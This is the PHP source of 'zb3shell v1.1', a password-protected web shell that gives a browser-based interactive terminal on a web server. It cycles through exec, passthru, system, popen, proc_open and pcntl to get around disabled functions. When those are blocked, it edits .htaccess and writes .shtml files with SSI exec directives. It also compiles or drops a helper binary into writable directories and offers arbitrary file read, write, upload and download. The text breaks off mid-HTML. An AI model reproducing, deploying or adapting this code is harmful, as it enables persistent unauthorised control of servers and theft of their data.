<?php
$default_cwd = '';
$pw_c_hash = '2831078ebcd1ccbac4aef451df3af299ac4c1b3e';
$hash_c_hash = '80bc8f7f441c565a3c1428666cf29321b09d5f06';

ini_set('display_errors',0);

function real2path($wat)
{
 if (substr($wat, 0, 1)!='/' && substr($wat, 0, 1)!='.')
 return realpath('./'.$wat);
 else return realpath($wat);
}
function slashon($str)
{
 return str_replace('"', '\\"', str_replace('\\', '\\\\', $str));
}
function is_enabled($wat)
{
 $disabled = explode(', ', ini_get('disable_functions'));
 return function_exists($wat) && !in_array($wat, $disabled);
}
function exec_compat($wat) //TEST THIS FUNCTION!!! (sync)
{
 if (function_exists('exec') && is_enabled('exec'))
 {
  exec($wat);
  return 1;
 }
 if (function_exists('passthru') && is_enabled('passthru'))
 {
  passthru($wat);
  return 1;
 }
 if (function_exists('shell_exec') && is_enabled('shell_exec'))
 {
  shell_exec($wat);
  return 1;
 }
 if (function_exists('system') && is_enabled('system'))
 {
  system($wat.' &> /dev/null');
  return 1;
 }
 if (function_exists('popen') && is_enabled('popen'))
 {
  $lol = popen($wat, 'r'); 
  while(!feof($lol))
  {
   fgets($lol);
  }
  pclose($lol);
  return 1;
 }
 if (function_exists('proc_open') && is_enabled('proc_open'))
 {
  $fake = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
  $lol = proc_open($wat, $fake, $fake2);
  while(!feof($fake2[1]))
  {
   fgets($fake2[1]);
  }
  fclose($fake2[2]);
  fclose($fake2[1]);
  fclose($fake2[0]);
  proc_close($wat);
  return 1;
 }
 if (function_exists('pcntl_exec') && function_exists('pcntl_fork') && is_enabled('pcntl_exec') && is_enabled('pcntl_fork'))
 {
  $f = pctnl_fork();
  if ($f==-1) return 0;
  if (!$f)
  {
   $e = explode(' ', $wat);
   $p = pcntl_exec(substr($wat, 0, strpos($wat, ' ')), @explode(' ', substr($wat, strpos($wat, ' ')+1)));
  }
  else pcntl_waitpid($f, $status);
  return 1;
 }
 return 0;
}
function v($sth) //value there. "0" is a value
{
 return strlen($sth); //temporary but in fact 100% valid
}
function can_exec_there($dir)
{
 $tmp = 0;
 while(file_exists($dir.'/zl'.++$tmp));
 touch($dir.'/zl'.$tmp);
 $ret = false;
 chmod($dir.'/zl'.$tmp, 0777);
 $ret = is_executable($dir.'/zl'.$tmp);
 unlink($dir.'/zl'.$tmp);
 return $ret;
}
function hash_for_pw($str)
{
 return sha1(sha1(sha1(strrev(sha1($str))).strrev(sha1(sha1(strrev(md5('()'.sha1(sha1($str).strrev(sha1($str))))))).md5($str)).'zb3'));
}
function hash_for_hash($str)
{
 return sha1(sha1($str).strrev(md5('()'.strrev(sha1(strrev($str).md5(strrev($str.md5(sha1($str)))))).sha1(sha1($str).strrev(sha1($str))))));
}
function hash_for_pw_hash($str)
{
 return sha1(sha1(sha1(strrev(sha1(sha1(strrev(md5('()'.sha1(sha1($str).strrev(sha1($str))))))))).strrev(md5($str)).'zb3'));
}
function z2_good_password($pass)
{
 global $pw_c_hash;
 return $pw_c_hash==hash_for_pw($pass);
}
function z2_good_cookie_hash($hash) //this must do sth with IP
{
 global $hash_c_hash;
 return $hash_c_hash==hash_for_pw_hash($hash);
}
function z2_find_exec_directory()
{
 $xtdir = '';
 if ($xtdir=z2_make_dir(getcwd()))
 return(z2_make_dir(getcwd()));
 else if ($xtdir=z2_make_dir('/tmp'))
 return(z2_make_dir('/tmp'));
 else if ($xtdir=z2_make_dir('/var/tmp'))
 return(z2_make_dir('/var/tmp'));
 else return FALSE;
}
function z2_find_shell()
{
 if (is_executable('/bin/bash')) return '/bin/bash';
 else if (is_executable('/usr/bin/bash')) return '/usr/bin/bash';
 else if (is_executable('/usr/local/bin/bash')) return '/usr/local/bin/bash';
 else if (is_executable('/bin/sh')) return '/bin/sh';
 else if (is_executable('/usr/bin/sh')) return '/usr/bin/sh';
 else if (is_executable('/usr/local/bin/sh')) return '/usr/local/bin/sh';
 else if (is_executable('/bin/ash')) return '/bin/ash';
 else if (is_executable('/usr/bin/ash')) return '/usr/bin/ash';
 else if (is_executable('/bin/zsh')) return '/bin/zsh';
 else if (is_executable('/usr/bin/zsh')) return '/usr/bin/zsh';
 else if (is_executable('/bin/csh')) return '/bin/csh';
 else if (is_executable('/usr/bin/csh')) return '/usr/bin/csh';
 else if (is_executable('/bin/tcsh')) return '/bin/csh';
 else if (is_executable('/usr/bin/tcsh')) return '/usr/bin/tcsh';
 else if (is_executable('/bin/ksh')) return '/bin/ksh';
 else if (is_executable('/usr/bin/ksh')) return '/usr/bin/ksh';
 else return FALSE;
}
function z2_vfs_get($file)
{
 global $vfs;
 return base64_decode($vfs[$file]);
}
function z2_make_dir($dir)
{
 if (substr($dir, -1, 0)=='/') $dir = substr($dir, 0, strlen($dir)-1);
 if (is_dir($dir))
 {
  if (file_exists($dir.'/.') && is_writable($dir) && can_exec_there($dir))
  return $dir;
  else
  {
   @chmod($dir, fileperms($dir)|0x0080|0x0100|0x0040);
   if (file_exists($dir.'/.') && is_writable($dir) && can_exec_there($dir))
   return $dir;
   else return FALSE;
  }
 }
 else
 {
  if (!mkdir($dir, 0700, true))
  return FALSE;
  else if (file_exists($dir.'/.') && is_writable($dir) && can_exec_there($dir))
  return $dir;
  else return FALSE;
 }
}
function setcookie2($a, $b)
{
 setcookie($a, $b);
 $_COOKIE[$a] = $b;
}
if (!z2_good_cookie_hash($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'auth']))
{
 $errstr = ''; $xtdir = '';
 if (v($_POST['pass']) && z2_good_password($_POST['pass']))
 {
  if (!v($_POST['dir']))
  {
   if (($xtdir=z2_find_exec_directory())===FALSE)
   $errstr = 'ERROR: Can\'t find exec directory<br><br>';
   else setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'dir', $xtdir);
  }
  else if (v($_POST['dir']) && ($xtdir=z2_make_dir($_POST['dir'])))
  setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'dir', $xtdir);
  else if (v($_POST['dir']))
  $errstr = 'ERROR: Invalid exec directory<br><br>';
  if (!v($errstr))
  {
   if (!v($_POST['cwd'])) setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'cwd', ($default_cwd)?($default_cwd):getcwd());
   else if (v($_POST['cwd']) && @file_exists($_POST['cwd'].'/.')) setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'cwd', $_POST['cwd']);
   else $errstr = 'ERROR: Invalid working directory<br><br>';
  }
  if (!v($errstr))
  {
   if (!v($_POST['shell']))
   {
    $xtdir = '';
    if (($xtdir=z2_find_shell())===FALSE)
    $errstr = 'ERROR: Can\'t find shell<br><br>';
    else {setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'shell', $xtdir);}
   }
   else if (v($_POST['shell']) && is_executable($_POST['shell']))
   setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'shell', $_POST['shell']);
   else
   $errstr = 'ERROR: Invalid shell<br><br>';
  }
  if (!v($errstr) && v($_POST['term'])) setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'term', $_POST['term']);
  else if (!v($errstr) && !v($_POST['term'])) setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'term', 'xterm');
  if (!v($errstr)) setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'auth', hash_for_hash($_POST['pass']));
 } else if (isset($_POST['pass'])) $errstr = 'ERROR: Invalid password<br><br>';
 if (!v($_POST['pass']) || v($errstr))
 {
  $warning = '';
  if (!exec_compat('whoami'))
  $warning .= 'WARNING: PHP execution functions are disabled. Using SSI<br><br>';
  echo('<html><style>
body
{
 background-color: black; color: white;
 font-family: Arial; font-size: 10pt;
}
input[type="text"], input[type="password"], textarea
{
 width: 100%;
 background-color: black; color: white;
 box-sizing: border-box;
 -moz-box-sizing: border-box;
}
</style>
<title>zb3shell: Login</title>
<div style="width: 300px; margin: auto;border: 0px solid grey; padding: 3px;"><form action="" method="post"><span style="font-size: 46px;">zb3shell v1.1</span><br><br>TIP: You can use Scroll Lock when Ctrl is blocked<br><br><div id="error" style="color: red;">'.$errstr.'</div><div id="warning" style="">'.$warning.'</div>Password:<br><input type="password" name="pass"><br><br>Exec directory: (leave blank for auto)<br><input type="text" name="dir" value="'.((v($_POST['dir']))?($_POST['dir']):($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'])).'"><br><br>Working directory: <br><input type="text" name="cwd" value="'.((v($_POST['cwd']))?($_POST['cwd']):($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'cwd'])).'"><br><br>Shell: (leave blank for auto)<br><input type="text" name="shell" value="'.((v($_POST['shell']))?($_POST['shell']):($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'shell'])).'"><br><br>Term: (leave blank for auto)<br><input type="text" name="term" value="'.((v($_POST['term']))?($_POST['term']):($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'term'])).'"><br><br><input type="submit" value="Login"></form>
</div></html>');
  exit;
 }
 header("HTTP/1.1 303 See Other");
 header("Location: {$_SERVER['REQUEST_URI']}");
 exit;
}
include('zb3shell.vfs');
if ($_GET['setsession'])
{
 $ok = 1; $ndir = $ncwd = $nshell = $nterm = '';
 if (v($_POST['dir']) && file_exists($_POST['dir'].'/.') && is_writable($_POST['dir']) && can_exec_there($_POST['dir']))
 $ndir = $_POST['dir'];
 else if (v($_POST['dir'])) {echo('ERROR: Invalid exec directory');exit;}
 else if (!v($_POST['dir']))
 {
  $xtdir = '';
  if (($xtdir=z2_find_exec_directory())===FALSE)
  {echo('ERROR: Can\'t find exec directory');exit;}
  else $ndir = $xtdir;
 }
 if (v($_POST['cwd']) && @file_exists($_POST['cwd'].'/.')) $ncwd = $_POST['cwd'];
 else if (v($_POST['cwd'])) {echo('ERROR: Invalid working directory');exit;}
 else $ncwd = getcwd();
 if (!v($_POST['shell']))
 {
  $xtdir = '';
  if (($xtdir=z2_find_shell())===FALSE)
  {echo('ERROR: Can\'t find shell');exit;}
  else $nshell = $xtdir;
 }
 else if (v($_POST['shell']) && is_executable($_POST['shell']))
 $nshell = $_POST['shell'];
 else
 {echo('ERROR: Invalid shell');exit;}
 if (v($_POST['term'])) $nterm = $_POST['term'];
 else if (!v($_POST['term'])) $nterm = 'xterm';
 echo('ok:'.bin2hex($ndir).':'.bin2hex($ncwd).':'.bin2hex($nshell).':'.bin2hex($nterm));
 setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'dir', $ndir); setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'cwd', $ncwd); setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'shell', $nshell); setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'term', $nterm);
 exit;
}
if ($_POST['logout'])
{
 setcookie2(bin2hex($_SERVER['SCRIPT_NAME']).'auth', '');
 exit;
}
if ($_GET['vfs_get'])
{
 $ext = substr($_GET['vfs_get'], strrpos($_GET['vfs_get'], '.')+1);
 if ($ext=='html') header('Content-type: text/html;charset=UTF-8');
 else if ($ext=='css') header('Content-type: text/css');
 else if ($ext=='js') header('Content-type: application/javascript');
 else if ($ext=='gif') header('Content-type: image/gif');
 echo(z2_vfs_get($_GET['vfs_get']));
 exit;
}
if (!function_exists('utf8_encode'))
{
 function utf8_encode($str)
 {
  $enc = ''; $n = $c = 0; $strl = strlen($str);
  for($n=0;$n<$strl;$n++)
  {
   if (($c=ord($str[$n]))<128) $enc .= $str[$n];
   else $enc .= chr(($c>>6)|192).chr(($c & 63)|128);
  }
  return $enc;
 }
}
if (!function_exists('utf8_decode'))
{
 function utf8_decode($str)
 {
  $enc = ''; $n = $nc = $c = 0; $strl = strlen($str);
  for($n=0;$n<$strl;$n++)
  {
   if (($c=ord($str[$n]))<191) $enc .= $str[$n];
   else if ($c<196) {$n++;if (($nc=(($c & 31) << 6) | (ord($str[$n]) & 63))<256) $enc .= chr($nc);}
  }
  return $enc;
 }
}
function valid_utf8($str)
{
 return (preg_match('%^(?:
      [\x09\x0A\x0D\x20-\x7E]            # ASCII
    | [\xC2-\xDF][\x80-\xBF]             # non-overlong 2-byte
    | \xE0[\xA0-\xBF][\x80-\xBF]         # excluding overlongs
    | [\xE1-\xEC\xEE\xEF][\x80-\xBF]{2}  # straight 3-byte
    | \xED[\x80-\x9F][\x80-\xBF]         # excluding surrogates
    | \xF0[\x90-\xBF][\x80-\xBF]{2}      # planes 1-3
    | [\xF1-\xF3][\x80-\xBF]{3}          # planes 4-15
    | \xF4[\x80-\x8F][\x80-\xBF]{2}      # plane 16
)*$%xs', $str));
}
if ($_POST['zb3pad_loadfile'])
{
 ob_flush();
 echo('zb3pad.statZero();');
 $_GET['file'] = utf8_decode($_GET['file']);
 $_GET['charset'] = utf8_decode($_GET['charset']);
 if (is_dir($_GET['file'])) {echo('alert("It\'s a directory!");');exit;}
 if (!file_exists(dirname($_GET['file']).'/.')) {echo('alert("Cannot read directory!");');exit;}
 if (!file_exists($_GET['file']) && !is_writable(dirname($_GET['file']))) {echo('alert("File does not exist, and specified directory is not writable!");');exit;}
 if (!file_exists($_GET['file']) && is_writable(dirname($_GET['file']))) {echo('alert("File does not exist, but specified directory is writable!");');exit;}
 if (file_exists($_GET['file']) && !is_readable($_GET['file'])) {echo('alert("Cannot read file!");');exit;}
 $file = fopen($_GET['file'], 'r');
 $fc = fread($file, filesize($_GET['file'])); $fc2 = '';
 if (strtolower($_GET['charset'])=='hex')
 {
  $fc2 = bin2hex($fc);
 }
 else if (function_exists('iconv'))
 {
  $fc2 = iconv(($_GET['charset'])?($_GET['charset']):('ISO-8859-1'), 'UTF-8', $fc);
  if ($fc!=iconv('UTF-8', ($_GET['charset'])?($_GET['charset']):('ISO-8859-1'), $fc2))
  {echo('alert("Couldn\'t convert encoding!");');exit;}
 }
 else if (function_exists('mb_convert_encoding'))
 {
  $fc2 = mb_convert_encoding($fc, 'UTF-8', ($_GET['charset'])?($_GET['charset']):('ISO-8859-1'));
  if ($fc!=mb_convert_encoding($fc2, ($_GET['charset'])?($_GET['charset']):('ISO-8859-1'), 'UTF-8'))
  {echo('alert("Couldn\'t convert encoding!");');exit;}
 }
 else
 {
  if (!$_GET['charset'] || strtoupper($_GET['charset'])=='ISO-8859-1')
  $fc2 = utf8_encode($fc);
  else if (strtoupper($_GET['charset'])=='UTF-8')
  {
   if (valid_utf8($fc)) $fc2 = $fc;
   else
   {echo('alert("Couldn\'t convert encoding!");');exit;}
  }
  else {echo('alert("Couldn\'t convert encoding!\\nOnly ISO-8859-1 or UTF-8 may work.");');exit;}
 }
 echo('zb3pad.fileTitle(hex2bin("'.bin2hex(real2path($_GET['file'])).'"));document.getElementById("zb3pad-editarea").value = decodeURIComponent(\''.rawurlencode($fc2).'\');zb3pad.lsc=zb3pad.el.value;');
 exit;
}
if ($_POST['zb3pad_savefile'])
{
 ob_flush();
 $_GET['file'] = utf8_decode($_GET['file']);
 $_GET['charset'] = utf8_decode($_GET['charset']);
 if (is_dir($_GET['file'])) {echo('alert("It\'s a directory!");');exit;}
 if (!file_exists(dirname($_GET['file']).'/.')) {echo('alert("Cannot read directory!");');exit;}
 if (!file_exists($_GET['file']) && !is_writable(dirname($_GET['file']))) {echo('alert("File does not exist, and specified directory is not writable!");');exit;}
 if (file_exists($_GET['file']) && !is_writable($_GET['file'])) {echo('alert("File is not writable!");');exit;}
 $fc = rawurldecode($_POST['fcontent']); $fc2 = '';
 if (strtolower($_GET['charset'])=='hex')
 {
  $fc2 = pack('H*', $fc);
 }
 else if (function_exists('iconv'))
 {
  $fc2 = iconv('UTF-8', ($_GET['charset'])?($_GET['charset']):('ISO-8859-1'), $fc);
  if ($fc!=iconv(($_GET['charset'])?($_GET['charset']):('ISO-8859-1'), 'UTF-8', $fc2))
  {echo('alert("Couldn\'t convert encoding!");');exit;}
 }
 else if (function_exists('mb_convert_encoding'))
 {
  $fc2 = mb_convert_encoding($fc, ($_GET['charset'])?($_GET['charset']):('ISO-8859-1'), 'UTF-8');
  if ($fc!=mb_convert_encoding($fc2, 'UTF-8', ($_GET['charset'])?($_GET['charset']):('ISO-8859-1')))
  {echo('alert("Couldn\'t convert encoding!");');exit;}
 }
 else
 {
  if (!$_GET['charset'] || strtoupper($_GET['charset'])=='ISO-8859-1')
  {
   $fc2 = utf8_decode($fc);
   if ($fc!=utf8_encode($fc2))
   {echo('alert("Couldn\'t convert encoding!");');exit;}
  }
  else if (strtoupper($_GET['charset'])=='UTF-8')
  $fc2 = $fc;
  else {echo('alert("Couldn\'t convert encoding!\\nOnly ISO-8859-1 or UTF-8 may work.");');exit;}
 }
 $file = fopen($_GET['file'], 'w');
 fwrite($file, $fc2);
 fclose($file);
 echo('zb3pad.fileTitle(hex2bin("'.bin2hex(real2path($_GET['file'])).'"));zb3pad.saved();');
 exit;
}
function return_bytes($val)
{
 $val = trim($val);
 $last = strtolower($val[strlen($val)-1]);
 switch($last)
 {
  case 'g':
  $val *= 1024;
  case 'm':
  $val *= 1024;
  case 'k':
  $val *= 1024;
 }
 return $val;
}
$msize = '';
function size_ok($total, $largest)
{
 //check total with min(memory, post)
 $tlimit = 0; $tlimit1 = 0;
 if (ini_get('memory_limit') && ini_get('memory_limit')!='-1') $tlimit = return_bytes(ini_get('memory_limit'));
 if (ini_get('post_max_size') && ini_get('post_max_size')!='-1') $tlimit1 = return_bytes(ini_get('post_max_size'));
 if ($tlimit)
 {
  if ($tlimit<$tlimit1)
  $tlimit1 = ini_get('memory_limit');
  else
  {
   $tlimit = $tlimit1;
   $tlimit1 = ini_get('post_max_size');
  }
 }
 else
 {
  $tlimit = $tlimit1;
  $tlimit1 = ini_get('post_max_size');
 }
 if ($tlimit && ($total>=$tlimit))
 {
  return("Total upload size too large!\nMax total size: ".$tlimit1);
 }
 //now check largest file size
 $llimit = 0;
 if (ini_get('upload_max_filesize') && ini_get('upload_max_filesize')!='-1') $llimit = return_bytes(ini_get('upload_max_filesize'));
 if ($llimit && $largest>$llimit)
 {
  return("Largest file size too large!\nMax file size: ".ini_get('upload_max_filesize'));
 }
 return false;
}
if (v($_GET['dir']))
{
 if (!is_writable($_GET['dir']))
 {
  echo('dirfail');
 }
 else if ($msize=size_ok($_GET['tsize'], $_GET['gsize']))
 {
  echo($msize);
 }
 else echo('ok');
 exit;
}
if ($_GET['upfile'])
{
 $renameit = $_POST['renameit']; $nfile = 0; $t=0;
 if (($nfile=count($_FILES['thefile']['tmp_name']))>1) $renameit = 0; $uploaded = array(); $fail = 0;
 for($t=0;$t<$nfile;$t++)
 {
  $nname = $_POST['dir'].'/'.(($renameit)?(basename($_POST['newname'])):(basename($_FILES['thefile']['name'][$t])));
  if (!move_uploaded_file($_FILES['thefile']['tmp_name'][$t], $nname))
  {$notuploaded[] = $_FILES['thefile']['name'][$t];$fail=1;}
 }
 if (($nfile==1 && $fail) || ($nfile>1 && $fail && count($notuploaded)==$nfile))
 {
  echo('fail');
 }
 else if ($nfile>1 && $fail)
 {
  echo("Partial success!\n\nFiles not uploaded:\n".implode("\n", $notuploaded));
 }
 else echo('ok');
 exit;
}
if ($_GET['canget'])
{
 echo((is_readable($_GET['canget']))?('ok'):('fail'));
 exit;
}
if ($_GET['getfile'])
{
 ob_end_clean();
 header('Content-Description: File Transfer');
 header('Content-Type: application/octet-stream');
 header('Content-Disposition: attachment; filename='.basename($_GET['getfile']));
 header('Content-Transfer-Encoding: binary');
 header('Expires: 0');
 header('Cache-Control: must-revalidate');
 header('Pragma: public');
 header('Content-Length: '.filesize($_GET['getfile']));
 flush();
 readfile($_GET['getfile']);
 exit;
}
if (v($_GET['session']))
$_POST['session'] = $_GET['session'];
if (v($_POST['session']))
{
 $fname0 = $_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/'.$_POST['session'].'.input';
 $fname1 = $_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/'.$_POST['session'].'.output';
 $fname2 = $_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/'.$_POST['session'].'.tsize';
 $fname3 = $_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/'.$_POST['session'].'.tstamp';
}
//if getfile: (not present in this version)

if ($_GET['init'] && v($_POST['session']))
{
 $tmp = 0; $tmp2 = 0; $tmp3 = 0;
 while(file_exists($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.(++$tmp).'.c'));
 $file = fopen($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.($tmp).'.c', 'w');
 fwrite($file, z2_vfs_get('serverside.c'));
 fclose($file);
 chmod($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.($tmp).'.c', 0700);
 while(file_exists($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.(++$tmp2)));
 while(file_exists($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2_gcc'.(++$tmp3)));
 if (exec_compat('whoami')==1)
 {
  exec_compat('gcc '.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp.'.c -o '.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2.' -lpthread -lutil &> dbg.cat');
  unlink($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.($tmp).'.c');
  if (is_executable($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2))
  {
   exec_compat($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2.' '.$_POST['session'].' '.$_POST['x'].' '.$_POST['y'].' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir']).' '.escapeshellarg('TERM='.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'term']).' '.escapeshellarg('HOME='.getcwd()).' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'shell']).' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'cwd']).' '.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2);
  }
  else
  {
   $file = fopen($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2, 'w');
   fwrite($file, z2_vfs_get('serverside'));
   fclose($file);
   chmod($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2, 0700);
   exec_compat($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2.' '.$_POST['session'].' '.$_POST['x'].' '.$_POST['y'].' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir']).' '.escapeshellarg('TERM='.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'term']).' '.escapeshellarg('HOME='.getcwd()).' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'shell']).' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'cwd']).' '.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2);
  }
 }
 else
 {
  $file = fopen($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2, 'w');
  fwrite($file, z2_vfs_get('serverside'));
  fclose($file);
  chmod($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2, 0700);

  //prepare htaccess
  $toadd = "\nOptions +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
  $file = fopen('.htaccess', 'rb+');
  $tcontent = fread($file, filesize('.htaccess'));
  if (substr($tcontent, -strlen($toadd), strlen($toadd))!=$toadd)
  fwrite($file, $toadd);
  fclose($file);
  $tmp4 = 0;
  while(file_exists($_POST['session'].(++$tmp4).'.shtml'));
  $file = fopen($_POST['session'].($tmp4).'.shtml', 'w');

  fwrite($file, '<!--#exec cmd="'.slashon('gcc '.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp.'.c -o '.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2_gcc'.$tmp3.' -lpthread -lutil').'" --><!--#exec cmd="'.slashon($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2_gcc'.$tmp3.' '.$_POST['session'].' '.$_POST['x'].' '.$_POST['y'].' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir']).' '.escapeshellarg('TERM='.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'term']).' '.escapeshellarg('HOME='.getcwd()).' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'shell']).' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'cwd']).' '.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2.' '.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp.'.c '.getcwd().'/'.$_POST['session'].($tmp4).'.shtml '.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2_gcc'.$tmp3).'" --><!--#exec cmd="'.slashon($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2.' '.$_POST['session'].' '.$_POST['x'].' '.$_POST['y'].' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir']).' '.escapeshellarg('TERM='.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'term']).' '.escapeshellarg('HOME='.getcwd()).' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'shell']).' '.escapeshellarg($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'cwd']).' '.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp2.' '.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/z2'.$tmp.'.c '.getcwd().'/'.$_POST['session'].($tmp4).'.shtml').'" -->');
  fclose($file);
  header('Location: '.$_POST['session'].$tmp4.'.shtml');
 }
 exit;
}
function tick()
{
 usleep(10000);
}
function microtime_float()
{
 list($usec, $sec) = explode(" ", microtime());
 return ((float)$usec + (float)$sec);
}
function cfwrite($towat, $wat, $watofwat=-1)
{
 if ($watofwat==-1) $watofwat = strlen($wat);
 $tmp = 0; $tmp2 = 0;
 while($tmp<$watofwat)
 {
  $tmp2 = fwrite($towat, substr($wat, $tmp));
  if ($tmp2 && ($tmp2>0))
  $tmp += $tmp2;
 }
}
if ($_GET['ping'])
{
 if (file_exists($fname3))
 {
  $file = fopen($fname3, 'wb');
  cfwrite($file, "x");
  fclose($file);
 }
 exit;
}
if ($_GET['resize'])
{
 if (file_exists($fname2))
 {
  $file = fopen($fname2, 'wb');
  $tt = $_POST['x']."|".$_POST['y'];
  cfwrite($file, $tt.str_repeat("\x00", 48-strlen($tt)));
  fclose($file);
 }
 if (!$_POST['keys'])
 exit;
}
if (v($_POST['keys']))
{
 if (file_exists($fname0))
 {
  $file = fopen($fname0, 'wb');
  cfwrite($file, pack('H*', $_POST['keys']));
  fclose($file);
 }
 exit;
}
else if ($_GET['poll'])
{
 header("Content-Type: text/event-stream\r\n");
 while (!($file = fopen($fname1, 'rb'))) usleep(1000);
 stream_set_blocking($file, false);
 while(1)
 {
  if (!file_exists($fname1)) {echo("data: TheFinalCommand\n\n");ob_flush();flush();exit;}
  while (strlen($tmp=fread($file, 2048)))
  {echo("data: ".bin2hex($tmp)."\n\n");ob_flush();flush();fseek($file, 0);}
  usleep(1000);
 }
}
else
{
 $sid = sha1(microtime_float());
 while(file_exists($_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'].'/'.$sid.'.input'))
 $sid = sha1(microtime_float());
 $dir2 = $_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'dir'];
 echo('<!DOCTYPE html>
<style>body {font-family: Arial; font-size: 10pt}</style>
<html>
  <head>
    <title>zb3shell</title>
    <link rel="stylesheet" href="'.$_SERVER['REQUEST_URI'].'?vfs_get=styles.css" type="text/css">
    <style type="text/css">
      body {
        margin: 0px;
      }
      input[type="text"], textarea
      {
       background-color: black; color: white;
       box-sizing: border-box;
       -moz-box-sizing: border-box;
      }
      a {color: cyan;}
    </style>
    <script type="text/javascript"><!--
      (function() {
        if (typeof navigator.appName == \'undefined\' ||
            navigator.appName != \'Netscape\') {
          document.write(\'<style type="text/css">\' +
                         \'#vt100 #console div, #vt100 #alt_console div {\' +
                         \'  overflow: hidden;\' +
                         \'}\' +
                         \'</style>\');
        }
      })();
    --></script>
  </head>
  <body onload="setTimeout(\'window.zshell = new zb3shell(\\\''.$sid.'\\\')\', 100)"
        scroll="no"><noscript>JavaScript
    must be enabled for zb3shell!!</noscript></body>
<script>
var z2_def_path = \''.$dir2.'\';
var z2_home_path = \''.$_COOKIE[bin2hex($_SERVER['SCRIPT_NAME']).'cwd'].'\';
</script>
<div style="display:none;width: 100%;height:100%;position: fixed; top:0px; left: 0px; background-color: rgba(123,123,123,0.4);overflow:auto;z-index:4;" id="z2-upload-overlay" onclick="z2_upload_overlay_OFF()">
